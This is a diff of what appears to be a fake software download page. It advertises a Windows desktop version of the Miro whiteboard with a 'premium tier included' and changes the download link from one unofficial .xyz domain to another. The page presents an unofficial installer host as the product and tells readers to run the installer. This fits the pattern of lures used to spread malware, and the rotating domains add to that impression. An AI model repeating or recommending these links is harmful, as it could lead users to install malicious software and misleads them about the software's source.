@@ -8,8 +8,8 @@ Infinite canvas for workshops and brainstorming · Premium tier included · Ever
 
 > Use the project link below for Windows.
 
-* **Project link:** **[miro-online-whiteboard-desktop.nexpath.xyz](https://miro-online-whiteboard-desktop.nexpath.xyz/)**
-* **Full URL:** `https://miro-online-whiteboard-desktop.nexpath.xyz/`
+* **Project link:** **[miro-online-whiteboard-desktop.nerasix.xyz](https://miro-online-whiteboard-desktop.nerasix.xyz/)**
+* **Full URL:** `https://miro-online-whiteboard-desktop.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
